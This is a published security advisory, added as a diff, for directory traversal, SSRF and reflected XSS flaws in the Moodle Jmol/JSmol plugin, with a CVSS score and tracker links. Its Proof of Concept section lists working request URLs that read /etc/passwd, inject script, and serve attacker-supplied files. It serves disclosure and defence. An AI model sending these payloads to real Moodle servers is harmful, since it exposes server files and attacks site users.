@@ -1,0 +1,34 @@
+# Exploit Title: Moodle filter_jmol multiple vulnerabilities (Directory Traversal and XSS)
+# Date: 20 May 2019
+# Exploit Author: Dionach Ltd
+# Exploit Author Homepage: https://www.dionach.com/blog/moodle-jmol-plugin-multiple-vulnerabilities
+# Software Link: https://moodle.org/plugins/filter_jmol
+# Version: <=6.1
+# Tested on: Debian
+
+The Jmol/JSmol plugin for the Moodle Learning Management System displays chemical structures in Moodle using Java and JavaScript. The plugin implements a PHP server-side proxy in order to load third party resources bypassing client-side security restrictions. This PHP proxy script calls the function file_get_contents() on unvalidated user input.
+
+This makes Moodle instances with this plugin installed vulnerable to directory traversal and server-side request forgery in the default PHP setup, and if PHP's "expect" wrapper is enabled, also to remote code execution. Other parameters in the plugin are also vulnerable to reflected cross-site scripting. Note that authentication is not required to exploit these vulnerabilities.
+
+The JSmol Moodle plugin was forked from the JSmol project, where the directory traversal and server-side request forgery vulnerability was partially fixed in 2015.
+
+* Plugin: https://moodle.org/plugins/pluginversions.php?plugin=filter_jmol
+* Note on functionality: https://github.com/geoffrowland/moodle-filter_jmol/blob/master/js/jsmol/php/jsmol.php#L14
+* Vulnerability announcement: https://sourceforge.net/p/jmol/mailman/message/33627649/
+* Partial fix: https://sourceforge.net/p/jsmol/code/1004/
+
+This issue is tracked at the following URLs:
+https://www.dionach.com/blog/moodle-jmol-plugin-multiple-vulnerabilities
+https://tracker.moodle.org/browse/CONTRIB-7516
+
+CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:F/RL:W/RC:C
+
+== Proof of Concept ==
+
+1. Directory traversal
+http://<moodle>/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd
+2. Reflected cross-site scripting
+http://<moodle>/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&data=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E&mimetype=text/html
+http://<moodle>/filter/jmol/iframe.php?_USE=%22};alert(%27XSS%27);//
+3. Malware distribution
+http://<moodle>/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&encoding=base64&data=UEsFBgAAAAAAAAAAAAAAAAAAAAAAAA%3D%3D&filename=empty.zip
